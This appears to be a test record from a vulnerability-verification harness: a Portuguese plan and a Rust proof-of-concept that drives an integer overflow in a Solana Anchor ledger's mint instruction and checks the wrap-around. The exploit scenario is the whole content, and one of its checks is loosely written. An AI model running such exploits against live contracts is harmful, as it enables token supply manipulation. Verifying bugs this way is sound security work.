{
  "plan": "O cenário inicializa a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 usando a instrução initialize (baseline legítimo). Em seguida, a instrução mint é chamada com amount = 10, que deveria causar overflow em total_supply. O efeito medido é que total_supply sofreu wrap-around (ficou menor que o valor inicial) em vez de a instrução falhar, confirmando a vulnerabilidade de integer overflow.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda não inicializada
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: inicializa o ledger com total_supply = u64::MAX - 5
let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);

let init_accounts = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];

let init_result = env.baseline("initialize ledger with max supply", &init_ix, &init_accounts);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = init_result
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, u64::MAX - 5, 0u64)), None));

// Ataque: mint com amount = 10, que deveria causar overflow em total_supply
let mint_ix = env.anchor_ix(
    "mint",
    &(10u64),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("mint with overflow amount", &mint_ix, &mint_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let total_supply_after = read_u64(ledger_data, 40); // authority(32) + total_supply(8) -> offset 40
    let user_balance_after = read_u64(ledger_data, 48);
    env.effect(
        "total_supply sofreu wrap-around (overflow) em vez de falhar",
        total_supply_after < u64::MAX - 5,
    );
    env.effect(
        "user_balance sofreu wrap-around (overflow) em vez de falhar",
        user_balance_after < 10,
    );
}"
}

